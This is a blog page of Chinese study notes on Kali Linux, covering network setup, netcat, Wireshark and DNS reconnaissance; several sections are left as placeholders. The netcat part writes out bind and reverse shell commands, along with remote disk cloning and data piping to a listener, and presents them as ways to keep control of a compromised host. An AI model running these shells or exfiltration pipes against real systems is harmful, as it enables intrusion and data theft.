@@ -1,0 +1,2118 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-kali与网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/26/kali%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
+  <time class="dt-published" datetime="2021-02-26T01:04:54.225Z" itemprop="datePublished">2021-02-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514211020515.png" alt="image-20200514211020515"></p>
+<h3 id="kali安全第三章——定制"><a href="#kali安全第三章——定制" class="headerlink" title="kali安全第三章——定制"></a>kali安全第三章——定制</h3><h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><p>默认通过DHCP</p>
+<h5 id="获取临时IP地址"><a href="#获取临时IP地址" class="headerlink" title="获取临时IP地址"></a>获取临时IP地址</h5><h6 id="IP、网关、路由"><a href="#IP、网关、路由" class="headerlink" title="IP、网关、路由"></a>IP、网关、路由</h6><p>自动获取：dhclient eth0</p>
+<p>手动获取：ifconfig eth0 192.168.1.11/24</p>
+<p>指定网关：（指定网关的过程就是指定默认的路由）</p>
+<p>route add default gw(网关的意思) 192.168.1.1</p>
+<p>查看路由信息：netstat -nr 或者 route -n</p>
+<p>添加网段（添加静态路由） ：route add -net 172.16.0.0/24（这里是网络地址，也可以指定主机地址，但掩码应为/32） gw 192.168.1.100（这里指定的网关应该与本机IP同网段，他之前指定了本机IP为192.168.1.10/24） eth0（可以指定网卡）</p>
+<h6 id="配置DNS-解析域名"><a href="#配置DNS-解析域名" class="headerlink" title="配置DNS(解析域名)"></a>配置DNS(解析域名)</h6><p>配置DNS就是编辑/etc/resolv.conf文件</p>
+<p>echo nameserver 192.168.1.1 &gt; /etc/resolv.conf(直接写入到resolv.conf文件,也可以vi写) </p>
+<p>resolv.conf文件格式: nameserver 8.8.8.8 (这个是谷歌的DNS服务器地址)  </p>
+<p>但以上所有ifconfig添加IP,路由等信息操作重启后失效  </p>
+<p>想长期保存需要通过修改配置文件</p>
+<p>vi /etc/network/interfaces:</p>
+<p> iface eth0 inet dhcp  默认eth0通过dhcp获IP</p>
+<p>如果想要设置静态IP</p>
+<p>改为 iface eth0 inet static</p>
+<p>(再设置地址掩码网关) </p>
+<p>address 192.168.0.1</p>
+<p>netmask 255.255.255.0</p>
+<p>gateway 192.168.0.254</p>
+<p>(network 192.168.20.0网络地址</p>
+<p>broadcast 192.168.20.255广播地址</p>
+<p>这俩可以不配)</p>
+<p>(在interfaces文件也可以修改DNS服务器地址,</p>
+<p>且在下次启动时,系统会自动把interfaces中的dns写入到resolv.conf文件)</p>
+<p>dns -nameservers 192.168.0.10 192.168.0.20  修改dns存储到interface里(当然也可以进vi改)</p>
+<p>vi里也可以添加静态路由:</p>
+<p>up route add -net 172.16.5.0/24 gw 192.168.10.100 eth1</p>
+<p>(up是指网卡启动之后,再添加这条静态路由)</p>
+<p>down route del -net 172.24.0.0/24</p>
+<p>(网卡卸载或关机后 删除这条路由)</p>
+<h4 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h4><p> apt-get update  实际上更新的是软件包的索引文件</p>
+<p>apt-get upgrade  根据索引文件更新软件包</p>
+<p>如果apt-get update出现错误,使用apt-get update –fix–missing</p>
+<h5 id="在配置文件中更改更新源"><a href="#在配置文件中更改更新源" class="headerlink" title="在配置文件中更改更新源"></a>在配置文件中更改更新源</h5><p>vi /etc/apt/sources.list :</p>
+<p> 默认有官方的三行以deb开头的更新源</p>
+<p>(注释掉这三个国外的)</p>
+<p>添加科技大学的三个更新源(待查)</p>
+<p>当kali给予的Debian有大版本升级时，通过apt-get dist-grade升级</p>
+<p>需要多次重复执行确保更新完整</p>
+<h5 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h5><p>库：apt-get命令  </p>
+<p>常用的工具软件：</p>
+<p>apt-get install kali-linux-all smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany meld stardict ttf-wqy-microhei kchmviewer resolvconf python-dev python-greenlet python-gevent python-vte python-openssl python-crypto pythonappindicator python-pip libnss3-tools freemind netspeed libncurses5-dev mtr filezilla filezillacommon chromium monodevelop mono-gmcs -y</p>
+<h5 id="安装浏览器插件"><a href="#安装浏览器插件" class="headerlink" title="安装浏览器插件"></a>安装浏览器插件</h5><p> firefox浏览器插件</p>
+<ul>
+<li>flashgot 、autoproxy 、Tamper Data 、cookie importer、Cookies Manager、User Agent Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、 Flagfox、hashr </li>
+<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/xss-8me/">https://addons.mozilla.org/en-US/firefox/addon/xss-8me/</a> </li>
+<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss</a></li>
+</ul>
+<h5 id="安装java"><a href="#安装java" class="headerlink" title="安装java"></a>安装java</h5><ul>
+<li><p>下载 </p>
+<p><a target="_blank" rel="noopener" href="http://java.sun.com/javase/do">http://java.sun.com/javase/do</a> wnloads/index.jsp </p>
+</li>
+<li><p>解包拷贝 </p>
+<ul>
+<li><p>tar -xzvf /root/jdk-7u45-linux-x64.tar.gz  </p>
+</li>
+<li><p>mv jdk1.7.0_45 /opt  （解压后文件夹移动到别处）</p>
+</li>
+<li><p>cd /opt/jdk1.7.0_45 </p>
+</li>
+</ul>
+</li>
+<li><p>安装注册</p>
+<ul>
+<li>update-alternatives –install /usr/bin/java java /opt/jdk1.7.0_45/bin/java 1 </li>
+<li>update-alternatives –install /usr/bin/javac javac /opt/jdk1.7.0_45/bin/javac 1 </li>
+<li>update-alternatives –install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so / opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so 1</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>默认设置（让安装注册后的java生效）</p>
+<ul>
+<li>update-alternatives –set java /opt/jdk1.7.0_45/bin/java </li>
+<li>update-alternatives –set javac /opt/jdk1.7.0_45/bin/javac</li>
+<li>update-alternatives –set mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so</li>
+</ul>
+</li>
+<li><p>验证</p>
+<ul>
+<li>java –version</li>
+<li>在浏览器里验证java是否生效<a target="_blank" rel="noopener" href="http://www.java.com/en/download/installed.jsp">http://www.java.com/en/download/installed.jsp</a></li>
+</ul>
+</li>
+</ul>
+<h5 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h5><ul>
+<li><p>Nvidia显卡驱动安装 </p>
+<ul>
+<li>apt-get update apt-get dist-upgrade </li>
+<li>apt-get install -y linux-headers-$(uname -r) </li>
+<li> apt-get install nvidia-kernel-dkms</li>
+<li>sed ‘s/quiet/quiet nouveau.modeset=0/g’ -i /etc/default/grub update-grub reboot </li>
+</ul>
+</li>
+<li><p>验证： </p>
+<ul>
+<li>glxinfo | grep -i “direct rendering“ <ul>
+<li>direct rendering: Yes</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="安装无线网卡补丁"><a href="#安装无线网卡补丁" class="headerlink" title="安装无线网卡补丁"></a>安装无线网卡补丁</h5><ul>
+<li>最新版内核已经集成⽆无线驱动补丁</li>
+<li>如果你在使⽤用⽼老版本内核<ul>
+<li>cd /usr/src/</li>
+<li>wget <a target="_blank" rel="noopener" href="https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-3.12-1.tar.bz2">https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-3.12-1.tar.bz2</a> </li>
+<li>tar xvf backports-3.12-1.tar.bz2</li>
+<li>cd backports-3.12-1</li>
+<li>apt-get install patch</li>
+<li>wget <a target="_blank" rel="noopener" href="http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch">http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch</a> </li>
+<li>patch -p1 &lt; mac80211.compat08082009.wl_frag+ack_v1.patch</li>
+<li>apt-get install libncurses5-dev</li>
+<li>airmon-ng （查看驱动）</li>
+<li>make defconfig-ath9k</li>
+<li>make &amp;&amp; make install</li>
+</ul>
+</li>
+</ul>
+<h5 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h5><ul>
+<li><p>Ulimite⽤用于限制当前 shell 内进程的资源使⽤用</p>
+</li>
+<li><p>查看默认值 </p>
+<ul>
+<li>Ulimite –a </li>
+</ul>
+</li>
+<li><p>全局配置⽂文件 ：/etc/security/limits </p>
+<ul>
+<li><domain> <type> <item> <value> </li>
+</ul>
+</li>
+<li><p>用途距离 </p>
+<ul>
+<li><p>限制文件块⼤大⼩小：ulimit – s 100</p>
+</li>
+<li><p>限制shell内存使⽤用：ulimit -m 5000 -v 5000（最大五千最小五千，在ulimit -a里可以查看含义）</p>
+<p>（执行5000的限制后，可以发现连ls都不能用了）</p>
+</li>
+<li><p>当shell关闭时，限制消失</p>
+</li>
+<li><p>如果要限制一直保持，vi .bashrc</p>
+<ul>
+<li>文件末直接添加诸如ulimit -s 100等命令</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>没有直接对socket数量的限制参数</p>
+<ul>
+<li>Linux系统中⼀一切都是⽂文件，运⾏行中的⽂文件叫做进程 </li>
+<li>ulimite –n 800000(DOS攻击需要同时打开很多文件，默认才1024)</li>
+</ul>
+</li>
+</ul>
+<h5 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h5><ul>
+<li>延⻓长电池寿命<ul>
+<li>⽆无操作挂起、关闭显⽰示器</li>
+<li>降低显⽰示器亮度</li>
+<li>不使⽤用时关闭⽆无线网卡</li>
+<li>开启硬盘省电选项<ul>
+<li>hdparm -i /dev/sda if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/ sda</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>启动笔记本模式<ul>
+<li>下面是一个脚本，新建一个shell脚本（1.sh）复制进去运行<ul>
+<li>#!/bin/bash <br> <br>currentMode=$(cat /proc/sys/vm/laptop_mode) <br> <br>if [ $currentMode -eq 0 ] then echo “5” &gt; /proc/sys/vm/laptop_mode echo “Laptop Mode Enabled” else echo “0” &gt; /proc/sys/vm/laptop_mode echo “Laptop Mode Disabled” fi </li>
+</ul>
+</li>
+<li>运行脚本<ul>
+<li>chmod  a+x  1.sh</li>
+<li>./1.sh</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h5><ul>
+<li><p>Kali Linux默认未启动所有网络服务</p>
+</li>
+<li><p>update-rc.d ssh default</p>
+<ul>
+<li><p>pass</p>
+</li>
+<li><p>linux运行级别</p>
+</li>
+<li><p>pass</p>
+</li>
+<li><p>pass</p>
+</li>
+</ul>
+</li>
+</ul>
+<h6 id="Linux运行级别"><a href="#Linux运行级别" class="headerlink" title="Linux运行级别"></a>Linux运行级别</h6><p>pass</p>
+<ul>
+<li>/etc/init.d/ssh start（临时打开网络服务）</li>
+</ul>
+<h3 id="kali安全第四章——实验环境"><a href="#kali安全第四章——实验环境" class="headerlink" title="kali安全第四章——实验环境"></a>kali安全第四章——实验环境</h3><p>pass</p>
+<h3 id="kali安全第五章——基本工具"><a href="#kali安全第五章——基本工具" class="headerlink" title="kali安全第五章——基本工具"></a>kali安全第五章——基本工具</h3><p>• 经常使⽤且功能强⼤ • 安全从业者必不可少的帮⼿ • Nc / ncat • Wireshark • Tcpdump</p>
+<h4 id="NETCAT-——NC"><a href="#NETCAT-——NC" class="headerlink" title="NETCAT ——NC"></a>NETCAT ——NC</h4><p>• ⺴络⼯具中的瑞⼠军⼑——⼩⾝材、⼤智慧 • 侦听模式 / 传输模式 • telnet / 获取banner信息 • 传输⽂本信息 • 传输⽂件/⺫录 • 加密传输⽂件 • 远程控制/⽊⻢ • 加密所有流量 • 流媒体服务器 • 远程克隆硬盘</p>
+<h5 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h5><p>nc –nv 1.1.1.1 110 • nc –nv 1.1.1.1 25 • nc –nv 1.1.1.1 80</p>
+<p>Telnet<em>协议是TCP/IP协议族中的一员,是Internet</em>远程登录*服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。</p>
+<p>nc有两种方式（作为客户端、作为服务器端）</p>
+<p><strong>后续讲解会以案例的方式介绍工具使用</strong></p>
+<p>nc -h 查询参数</p>
+<p>nc作为客户端：</p>
+<p>常用 nc -vn （-v：显示详细信息 -n 指定IP地址（不会自动解析域名））</p>
+<p>一般不建议nc后面接域名，因为解析很慢（直接ping域名就可以找到ip）</p>
+<p><strong>实例</strong> </p>
+<p>ping pop3.163.com</p>
+<p>nc -vn 123.126.97.79 110(pop3端口为110)</p>
+<p><em>(UNKNOWN) [123.126.97.79] 110 (pop3) open</em><br><em>+OK Welcome to coremail Mail Pop3 Server (163coms[10774b260cc7a37d26d71b52404dcf5cs])</em></p>
+<p>(此时可以user+（base64加密后的账户），即登入163邮箱)（base64加密： base64 + 字符串，ctrl+D结束输入）</p>
+<p>作为客户端：（事先连接kali与metasploitable）</p>
+<p>nc -vn metasploitable的IP 80（http的端口）</p>
+<p>再head /</p>
+<p>作为服务端：</p>
+<h5 id="NC——传输文本信息（聊天）"><a href="#NC——传输文本信息（聊天）" class="headerlink" title="NC——传输文本信息（聊天）"></a>NC——传输文本信息（聊天）</h5><p> • A：nc -l -p 4444 • B：nc –nv 1.1.1.1 4444<br>• 远程电⼦子取证信息收集</p>
+<p>需要其中一台为服务器，开放一个端口</p>
+<p>nc -l -p 4444 （-l 侦听端口，-p指定端口号也是打开端口）</p>
+<p>（这是可以  netstat -pantu | grep 4444   查看端口情况）</p>
+<p>另一端nc –nv 1.1.1.1 4444 就可以对话了</p>
+<p>这种方式的主要作用是电子取证，对于可能被入侵的计算机，要尽可能的修改当前状态，不增删文件，有可能覆盖扇区，难以恢复。</p>
+<p>  方法就是：</p>
+<p>在自己的电脑上开端口并侦听</p>
+<p>以需要查看目标系统文件目录为例，为不影响，需要将文件目录直接保存到我的电脑，而不是先存在目标系统再传过来</p>
+<p>ls -l | nc -nv 自己电脑IP 端口</p>
+<p>还有一种方法是：</p>
+<p>在自己电脑上 nc -l -p 333 &gt; ps.txt</p>
+<p>这句命令指如果端口侦听到信息，就放到ps.txt文件里（&gt;是重定向命令）</p>
+<p>这时在目标系统  ps aux | nc -nv 我的电脑IP 端口 -q 1</p>
+<p>（ps aux 是查看进程信息   -q指 在标准输出输出完后，自动在一定时间后退出，即命令执行完成1秒后自动断开nc连接，，，（忘记命令可以nc -h查看））</p>
+<p>（l取证也会用到lsof命令，lsof是指？？）</p>
+<h5 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h5><p> 传输⽂文件 （&gt;就是输出，&lt;就是输入）</p>
+<p>• A：nc -lp 333 &gt; 2.mp4 （这其实就类似一个ftp可上传的服务器，只是指定上传的东西都叫2.mp4</p>
+<p>• B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1 </p>
+<p>• 或 </p>
+<p>• A：nc -q 1 -lp 333 &lt; a.mp4 （a注入到端口，别人一来连就发送） </p>
+<p>• B： nc -nv 1.1.1.1 333 &gt; 2.mp4 </p>
+<p>• 传输目录 </p>
+<p>• A：tar -cvf - music/ | nc -lp 333 –q 1   （tar -cvf - music/ 是把目录打包成一个文件）</p>
+<p>• B：nc -nv 1.1.1.1 333 | tar -xvf –   （tar -xvf –  是解包） </p>
+<p>• 加密传⽂文件 </p>
+<p>• A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p>
+<p>• B： mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p>
+<p>（kali默认没安装mcrypt这个加密软件）</p>
+<h5 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h5><p>• A： cat 1.mp4 | nc -lp 333 </p>
+<p>• B： 1.1.1.1 333 | mplayer -vo x11 -cache 3000 </p>
+<p>（接收到的是视频流，直接播放）（mplayer也不是默认安装的）</p>
+<p>NC——端口扫描<br>• nc -nvz 1.1.1.1 1-65535   （-z 扫描模式，探测相应端口，探测之后不会进行io操作，仅用于查看端口是否开启）（1-65535，所有的端口）</p>
+<p>• nc –vnzu 1.1.1.1 1-1024  （探测所有UDP的端口） </p>
+<p>NC——远程克隆硬盘</p>
+<p> • A： nc -lp 333 | dd of=/dev/sda</p>
+<p> • B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1 </p>
+<p>（dd命令是块级别的复制，即目录删除但还未被覆盖的也能复制下来）</p>
+<p>• 远程电⼦子取证，可以将目标服务器硬盘远程复制，或者内存。</p>
+<h5 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h5><p>远程控制的常用场景是，通过漏洞进入了，为保证漏洞修复仍能连接，选择端口与连接保持持续控制。</p>
+<p>（windows一般要远程控制，需要打开3389端口</p>
+<p>• 正向： </p>
+<p>• A：nc -lp 333 -c bash （一旦侦听到连接，就把bash这个shell给对方） </p>
+<p>• B：nc 1.1.1.1 333 </p>
+<p>正向是 被攻击侦听，攻击端连接端口。但这样的问题是需要保证攻击端能连到被攻击端，不被防火墙阻隔。</p>
+<p>现实往往不能如此，所以一般采用反向<br>被攻击端写一个启动服务脚本，让被攻击端去连接我的电脑上的端口。<br>( 比如一般服务器也要连接DNS  53端口，就让服务器也连到我的电脑的53端口）</p>
+<p>• 反向： </p>
+<p>• A：nc -lp 333 </p>
+<p>• B：nc 1.1.1.1 333 -c bash </p>
+<p>• 注：Windows⽤用户把bash改成cmd；</p>
+<h5 id="NC-——NCAT"><a href="#NC-——NCAT" class="headerlink" title="NC ——NCAT"></a>NC ——NCAT</h5><p>NC还是有弱点，都是明文传输的，可能被嗅探，中间人攻击，arp欺骗。<br>NC 缺乏加密和身份验证的能力</p>
+<p>NCAT可以弥补nc这方面的缺陷<br>ncat不是kali默认安装的，<br>ncat包含在nmap工具包中</p>
+<ul>
+<li>A： ncat -c bash -allow 19.168.20.14 -vnl 333 -ssl（被控端）<br>（ -allow是指允许那个IP地址可以连接</li>
+</ul>
+<p>-ssl做加密）</p>
+<ul>
+<li>B ： ncat -nv 1.1.1.1 333 -ssl<br>这样是对管道的加密</li>
+</ul>
+<p>不同系统/平台的农村、参数功能不尽相同<br>ubantu的是将shell重定向到一个临时文件，在管道里传临时文件。<br>建议每次连接都查一下nc -h参数<br>或者用man nc。（man就是manu，很详细的查询命令用法，但有时开发者没做man手册）</p>
+<h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>抓包引擎<br>Libpcap9——linux<br>Winpcap10——windows</p>
+<p>混杂模式会抓经过的包<br>建议都保存为pcap格式</p>
+<p>首选项</p>
+<p>筛选器<br>分抓包筛选器，显示筛选器</p>
+<p>在详情页右键ip，再edit菜单栏可以选择筛选掉或者保留</p>
+<p>常见协议包<br>数据包的分层结构</p>
+<p>ARP：<br>第一层（Frame）：多少帧，大小，传输时间等统计信息<br>第二层（ethernet）（以太网包头）：目标地址，源地址，二层协议的上层是什么协议<br>第三层（request）：硬件地址类型，协议类型</p>
+<p>SSDP：<br>第一层<br>第二层：这里“二层协议的上层”（就是第三层）显示的是IP，所以第三层是IP层<br>第三层（IP）：ipv4/ipv6，头长度，dfs，ip头到数据字段的长度，ipid，ttl ，protocol（第三层的上层的协议）<br>（这里显示的IGMP（2））（括号里是1就是icmp，是就是igmp，是6 就是tcp，17是udp，有很多而不只是tcp、udp）<br>ip头的校验值，options字段（包含源路由等，不是都有这个字段，一般IP有，udp没有）</p>
+<p>第四层：（TCP/UDP/ …. ）：<br>（TCP：）<br>源端口/目的端口，流的索引，sequence number，头长度（这里的头长度指tcp的头长度，ip的头长度是ip的头长度）<br>flag（ACK），。。。</p>
+<p>三次握手：先发一个syn，再收一个（收到ack+新的syn），再发一个ack<br>。<br>且发送一定量数据后又要重新来一次三次握手</p>
+<p>DNS：<br>DNS是基于第四层UDP的协议，不能称之为第五层，叫应用层的协议<br>查询：<br>一个递归询问的包，在第四层中有显示。第五层里有name，4A的type？，class是IN（internet），通常都是internet<br>响应：<br>回答了一个名称服务器，（即继续往下查），还有主机名等等很多信息。</p>
+<p>HTTP：<br>是基于TCP的应用层协议<br>应用层的报头内容就是http的一些功能，比如get http，ing求方法，uri，浏览器 类型，主机名，连接状态等等</p>
+<p>FTP：<br>应用层协议，基于TCP<br>wireshark区分协议默认是通过端口区分的。<br>但有时我们会设置http不仅工作在80端口，这时http协议就不会解析了<br>这时，右键数据包，选择 decode as，选择http，就能解析了</p>
+<p>数据流：<br>访问一个网站或者一个请求操作的时候就会产生很多包，如果一个个看很麻烦，采用wireshark数据流功能（视图）<br>右键包名，follow TCP Stream<br>视图里可以看到各个操作。</p>
+<p>http，smtp，pop3 都是明文传输的，存在安全隐患<br>因此推荐https，即用tls或者ssl加密，传输的数据包就都是密文<br>四层还是基于TCP的，这时看数据流就全是乱码</p>
+<h3 id="kali安全第六章—被动信息收集"><a href="#kali安全第六章—被动信息收集" class="headerlink" title="kali安全第六章—被动信息收集"></a>kali安全第六章—被动信息收集</h3><p>公开渠道可获得的信息<br>与目标不产生直接交互<br>尽量避免留下一切痕迹</p>
+<p>OSINT（有兴趣看这两个规范性文档）<br>开源智能的介绍？？<br>美国军⽅方:<a target="_blank" rel="noopener" href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a><br>北⼤大⻄西洋公约组织:<a target="_blank" rel="noopener" href="http://information-retrieval.info/docs/NATO-OSINT.html">http://information-retrieval.info/docs/NATO-OSINT.html</a></p>
+<p>信息收集内容</p>
+<p>IP地址段<br>域名信息<br>邮件地址<br>⽂文档图⽚片数据<br>公司地址<br>公司组织架构<br>联系电话 / 传真号码<br>⼈员姓名 / 职务<br>目标系统使⽤用的技术架构<br>公开的商业信息</p>
+<p>信息用途<br>⽤用信息描述目标<br>发现<br>社会⼯工程学攻击<br>物理缺⼝</p>
+<p>信息收集——DNS<br>域名解析成IP地址<br>    域名 与 FQDN的区别<br>    域名：xinlang .com<br>    FQDN（完全限定域名）：www .xinlang.com<br>    域名记录:A 、C nmae、NS、MX、ptr<br>    一个域名xinlang .com 下面可能有很多中域名记录，www。xinlang。com可能是一个主机记录，a记录，也可能是别名记录，c name记录。<br>    会有一个或者几个域名服务器，对这个域进行域名的解析，域名服务器地址是通过DNS里面的NS记录定义和注册的，针对邮件的MX记录，<br>    以上这四个都是把主机名解释成另一个主机名或者解析成ip地址<br>    而ptr记录类型是通过ip地址反向解析域名的记录</p>
+<pre><code>流程图：
+1我域名发送给本地的域名服务器——域名服务器解析，返回IP地址给我——2访问真正的新浪主机
+
+但
+</code></pre>
+<p>​<br>​<br><img src="https://i.loli.net/2020/02/23/oIeaOFRbpC6MkZs.jpg" alt="Alt"></p>
+<h5 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h5><p>nslookup进入<br><a target="_blank" rel="noopener" href="http://www.sina.com(输入域名就显示我正在使用的域名服务器地址——server,/">www.sina.com（输入域名就显示我正在使用的域名服务器地址——server，</a><br>这时可以发现Sina没有解析出来ip，而解析出来另一个域名（即不是a记录而是c nae记录），那么就再次解析这个域名，知道最后解析出来ip）<br>（最后可以发现，实际第一次解析就已经给出了最后的结果）</p>
+<p>set type=a、mx、ns、any<br>这里是设置一会解析的时候，只显示a记录/mx记录/ns记录</p>
+<p>以单查看mx记录为例，type=mx   sina。com 出现了三条记录，其中mail exchange数值越小，优先级越高（优先级就是指先去找哪个域名）</p>
+<p>（这是还可以继续往下查，比如mx记录中的一条 是feeemx1.sinamail.sina.com.cn<br>切换成type=a，对上面这个域名解析，就可以得到与sinaweb服务器不同的ip地址）<br>（同样的也可以查ns类型，即新浪的域名服务器地址，type=a情况下得到新浪域名服务器的地址，再通过type=ptr，ptr即反向查询，这里type也可以简写成为q=xxx，<br>ptr模式下，就应该能找回到原来的域名，但这里注意，一个域名可以解析出来多个ip地址，也可以有多个c name）</p>
+<p>server参数：<br>解析域名时，最上面会有一个server参数，显示一个ip地址，这个是当地的域名服务器地址。<br>如果不想用本地的域名解析服务器，可以 server+想用的域名服务器ip地址，（比如谷歌的8.8.8.8），可以指定域名服务器为自己解析<br>这时发现了奇怪现象，谷歌解析与之前解析得到的不一样，因为现在大多会使用智能DNS，随着终端用户使用的网络，返回的结果不一样</p>
+<p>nslookup -type=ns example.com 156.154.70.22</p>
+<h5 id="DNS信息收集——DIG"><a href="#DNS信息收集——DIG" class="headerlink" title="DNS信息收集——DIG"></a>DNS信息收集——DIG</h5><p>（后面隔了很多换行后的内容是ppt的内容）</p>
+<p>与lookup对比：</p>
+<p>$nslookup sina.com - type=any 8.8.8.8</p>
+<p>$dig sina.com any @8.8.8.8(指定域名服务器)</p>
+<p>（渗透的时候养成常换不同域名服务器的习惯，因为可能返回的结果并不相同）</p>
+<p>$ dig +noall mail.163.com any（noall参数指不输出任何结果</p>
+<p>$ dig +noall +answer mail.163.com any</p>
+<p>（只显示一条结果）</p>
+<p>$ dig +noall +answer mail.163.com any |awk ‘{print $5}’</p>
+<p>只显示结果中的第五列</p>
+<p>反向查询:（反向查询差的就是ptr记录，ptr记录？）</p>
+<p>dig -x 220.181.14.157</p>
+<p>dig +noall +answer -x 8.8.8.8</p>
+<p>下面介绍的功能nslookup就不能做了</p>
+<p>查dns服务器的bind版本信息：</p>
+<p>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</p>
+<p>（bind是linux上实现dns服务的软件包）</p>
+<p>（这种方式是能查出这个域名下的所有主机名，比之前查的更彻底，这里还不太明白）</p>
+<p>（通过dig虽然查不到所有主机名，但可以查到bind信息，如果发现采用以个比较老的bind，就可以利用漏洞把dns数据库攻破，下载所有数据就能得到域名下的所有主机名）</p>
+<p>（dns的版本信息也是dns中的一条记录，这条记录的类型是txt。类级别是chaos）</p>
+<p>（这样就查到了dns版本，然后去官网查看是否是最新版本，不是的，找官方的升级记录的描述文件，找到官方已经修补的漏洞）</p>
+<p>（但很多dns服务器也会隐藏自己的版本信息，返回空值）</p>
+<p>dns追踪：</p>
+<p>pc电脑发出的dns查询都是递归查询</p>
+<p>13年发生过国内.com域劫持 </p>
+<p>即与pc直接交流的都是本地的dns服务器，pc的查询记录在本地dns上都有保留，且一旦发生域名劫持，很难发现返回的是不是错误的信息。</p>
+<p>dig的dns追踪，可以直接向.服务器即跟服务器，直接向com服务器，直接向example.com服务器，查询，如果有劫持，在命令返回结果上就会有迹象</p>
+<p>dig +trace <a target="_blank" rel="noopener" href="http://www.sina.com/">www.sina.com</a></p>
+<p>返回的结果中，首先是13个以.开头的记录，即常说的13个根域名服务器，从13个根域名服务器里随机挑选一个查询.com域服务器，再随机挑选一个.com域服务器地址，继续往下查</p>
